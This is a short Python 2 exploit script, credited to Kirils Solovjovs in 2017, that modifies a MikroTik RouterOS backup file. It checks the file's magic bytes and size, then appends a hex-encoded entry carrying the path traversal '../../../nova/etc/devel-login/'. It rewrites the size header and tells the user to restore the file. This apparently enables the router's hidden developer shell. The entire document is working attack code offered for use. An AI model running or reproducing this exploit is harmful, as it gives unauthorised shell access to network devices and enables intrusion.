#!/usr/bin/python
# (C) Kirils Solovjovs, 2017

import sys,os
from struct import pack,unpack

def err(text):
	print text
	print
	quit(1)
	

if len(sys.argv) < 2:
	err("Usage: "+sys.argv[0]+" <backup_file>")

file=sys.argv[1]

if not os.path.exists(file):
	err("Directory "+file+" does not exist.")

if not os.access(file, os.R_OK) or not os.access(file, os.W_OK):
	err("File should be marked read/write. Check permissions.")

realsize=os.path.getsize(file)

with open(file,'r+b') as backup:

		if realsize<8 or backup.read(4) != "\x88\xAC\xA1\xB1":
			err("Please check that this is a recent RouterOS backup file w/o password protection.")
			
		matchsize, = unpack("<I",backup.read(4))
		if matchsize != realsize:
			err("File is damaged. Will not proceed.")

		#first we write our payload
		backup.seek(matchsize)
		
		backup.write("\x1E\x00\x00\x00\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F"+
			"\x6E\x6F\x76\x61\x2F\x65\x74\x63\x2F\x64\x65\x76\x65\x6C\x2D"+
			"\x6C\x6F\x67\x69\x6E\x2F\x00\x00\x00\x00\x00\x00\x00\x00")
		
		#finally we need to increase the size by 42
		matchsize += 42
		backup.seek(4)
		backup.write(pack("<I",matchsize))
		backup.close()
		
		print "Done. Now restore from "+file+"."
		print
